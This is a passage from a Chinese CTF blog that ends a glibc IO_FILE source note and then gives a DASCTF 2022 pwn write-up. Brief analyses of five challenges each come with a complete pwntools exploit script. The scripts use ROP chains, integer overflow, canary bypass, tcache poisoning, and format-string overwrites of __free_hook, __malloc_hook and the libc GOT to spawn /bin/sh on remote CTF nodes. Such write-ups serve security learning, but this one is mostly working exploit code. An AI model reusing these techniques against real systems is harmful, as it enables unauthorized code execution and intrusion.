<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_default_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_finish)</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
<li>一个文件流实际上只有一个缓冲区，read和write缓冲区指针都是指向缓冲区上的不同区域</li>
<li>_flags控制文件流的执行流程，并且最后都将执行vtable中的某函数</li>
</ul>
<p><strong>参考</strong><br><a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/">ctf-wiki</a><br><a href="https://www.anquanke.com/post/id/177958">IO FILE之fread详解</a><br><a href="https://www.cnblogs.com/ZIKH26/articles/16578093.html">IO学习–源码调试fwrite函数</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2022_部分pwn_wp</title>
    <url>/2022/07/27/DASCTF2022/</url>
    <content><![CDATA[<p>部分</p>
<span id="more"></span>

<h1 id="July"><a href="#July" class="headerlink" title="July"></a>July</h1><p>感觉最近积极性不强，没什么干劲。</p>
<h2 id="eyfor"><a href="#eyfor" class="headerlink" title="eyfor"></a>eyfor</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>保护只开了 Partial RELRO、NX。</p>
<p>按程序流程走，我们可以输入7次。</p>
<ul>
<li>前五次随便输入即可</li>
<li>第六次输入一个长整数，作为 vuln 函数的参数</li>
<li>第七次在 vlun 函数中，向栈上写入内容</li>
</ul>
<h3 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h3><ul>
<li>第一次输入存在溢出，但是没啥用。</li>
<li>第六次输入的内容是作为第七次输入的长度，但是由于 vuln 传参时是 int，而函数中转换为了 unsigned_int 因此存在一个整数溢出漏洞。利用这个向栈上写入 ropchain。</li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>同上</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25675</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=filename</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;go&quot;</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    sla(<span class="string">&quot;message:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x80000000</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400983</span></span><br><span class="line">buf    =<span class="number">0x00000000006010C0</span></span><br><span class="line">system =<span class="number">0x0000000000400680</span></span><br><span class="line">ret    =<span class="number">0x000000000040063e</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">48</span>,<span class="string">&#x27;\0&#x27;</span>)+p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(buf)+p64(system)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="MyCanary2"><a href="#MyCanary2" class="headerlink" title="MyCanary2"></a>MyCanary2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>保护只开了 Partial RELRO、NX。</p>
<p>程序会随机生成一个随机数，作为 canary。但是程序还提供了一个可以重新获取 canary 的功能，所以直接输入 ropchain 然后重新获取 canary 即可。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./MyCanary2&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26832</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./MyCanary2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=filename</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Input your choice&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">code</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Show me the code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401613</span></span><br><span class="line">binsh  =<span class="number">0x00000000004020F0</span></span><br><span class="line">system =<span class="number">0x0000000000401120</span></span><br><span class="line">ret    =<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="compact"><a href="#compact" class="headerlink" title="compact"></a>compact</h2><p>比赛时差一丢丢，当晚给补了。</p>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>glibc 版本为 2.31，保护全开。</p>
<p>程序具有4个功能：</p>
<ul>
<li>add: 创建两个大小分别为 0x10 与 0x80(mem) 的 chunk，0x10 的存放 tag 及另一个 chunk 的地址，被存放在一个 list 中；0x90 的存放用户输入的 data。除此之外还会对 tag 进行一次检测，根据结果可以对 0x10 中的指针进行覆盖。</li>
<li>show: 通过 list 与对应的 index 访问 chunk，并打印内容。</li>
<li>delete: 通过 list 与对应的 index 将指定 chunk 放入另一个 freed_list 中。</li>
<li>reset: 通过遍历 freed_list 将其中所以 chunk 释放。</li>
</ul>
<h3 id="漏洞及利用-1"><a href="#漏洞及利用-1" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h3><p>没啥漏洞，单纯利用 add 中的 tag 检测，获取修改指针的机会。</p>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li>由于 add 使用 malloc，不会清除 chunk 内容，通过这个泄露 heap。</li>
<li>利用 add 中的 tag 检测，修改指针指向一个 0x410 大小的 fake_chunk，同上泄露 libc，并构造了堆重叠。</li>
<li>利用堆重叠，将 __free_hook 地址插入到 tcache 中，申请后将之覆盖为 system，最后 getshell。</li>
</ul>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./compact&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29107</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./compact&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;give me your choice: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data,tag</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;data: &quot;</span>,data)</span><br><span class="line">    sa(<span class="string">&quot;tag: &quot;</span>,tag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>():</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">heap=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x20a</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">reset()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    free(i)</span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>),<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    add(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>),<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    payload+=p8(((heap+<span class="number">0x2d0</span>)&gt;&gt;<span class="number">8</span>*i&amp;<span class="number">0xff</span>))</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">main_arena=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ebf0a</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(free_hook)</span><br><span class="line">add(payload,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;/bin/sh\0&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">add(p64(system),<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>让我再想想</p>
<h1 id="DASCTF-X-CBCTF-2022九月挑战赛"><a href="#DASCTF-X-CBCTF-2022九月挑战赛" class="headerlink" title="DASCTF_X_CBCTF_2022九月挑战赛"></a>DASCTF_X_CBCTF_2022九月挑战赛</h1><h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>有两次输入机会，第一次输入有一点点的溢出，能泄漏libc。第二次的内容能利用格式化字符串漏洞，只需要通过一个检测。</p>
<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>第一个想法就是通过栈上的地址链去修改返回地址，但是这样需要爆破两个字节的内容，感觉不太行。</p>
<p>然后官方wp中提到可以修改libc上的got表地址，惊为天人，第一次这样用。但不知为何我本地的libc在ida中没有符号表，不容易找到wp中说的strlen_got，于是我直接在puts运行中随便找了个函数调用来修改(也许不是strlen)，大致过程就是通过跳转指令后的偏移来找的。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./cyberprinter&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./cyberprinter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)	</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;Your name?pls..&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">libc_base=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x1ec5c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">strlen_got=libc_base+<span class="number">0x1eb0a8</span></span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget_addr=libc_base+one_gadget[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">8</span>,&#123;strlen_got:one_gadget_addr&#125;)</span><br><span class="line">sla(<span class="string">&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>模拟酒吧，大致功能有：</p>
<ul>
<li>order: 能申请三种大小的chunk，从mem+2的位置开始写入，因此溢出了0x10</li>
<li>drink: 通过mem位置的数值来检测是否喝光，仅当*mem为0时才释放chunk，存在UAF</li>
<li>snack: 白给libc</li>
</ul>
<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>由于存在溢出，能够修改size位，形成堆重叠。因为有uaf，又能直接该fd，所以这道题有挺多方法做的。</p>
<ol>
<li>构造堆重叠后直接修改某个tcache的fd即可申请任意地址。</li>
<li>由于能改*mem，这个位置也同时是fd，那么利用uaf，直接把*mem喝为任意地址，就是有些难改，不推荐使用。</li>
<li>官方wp中，使用堆重叠构造一个double_free，将一个chunk同时放入unsorted_bin和tcache中，然后从unsorted_bin中申请合适的大小将下面的某个tcahe_fd覆盖为main_arena，相较于第二种好改些。</li>
</ol>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./bar&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bar&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)	</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Whisky , brandy or Vodka?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;You may want to tell sth to the waiter:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx,num</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;How much?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1ec6a0</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i+<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x441</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="comment">#system=libc_base+libc.sym[&#x27;system&#x27;]</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget=[<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget_addr=libc_base+one_gadget[<span class="number">1</span>]</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>)+p64(malloc_hook-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

